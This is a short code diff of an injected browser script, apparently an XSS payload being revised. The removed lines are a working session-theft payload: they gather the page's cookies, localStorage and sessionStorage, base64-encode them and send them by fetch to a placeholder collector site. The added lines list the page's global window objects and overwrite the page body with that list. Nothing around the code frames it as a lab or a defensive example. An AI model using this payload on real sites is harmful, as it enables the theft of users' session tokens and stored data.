@@ -1,9 +1,13 @@
 <script>
-let data = {
-  cookie: document.cookie,
-  localStorage: JSON.stringify(localStorage),
-  sessionStorage: JSON.stringify(sessionStorage)
-};
+let found = [];
 
-fetch("https://your-collector-site.com/log?d=" + btoa(JSON.stringify(data)));
+for (let key in window) {
+  try {
+    if (typeof window[key] === "object" || typeof window[key] === "function") {
+      found.push(key);
+    }
+  } catch(e) {}
+}
+
+document.body.innerHTML = "<pre>" + found.join("\n") + "</pre>";
 </script>
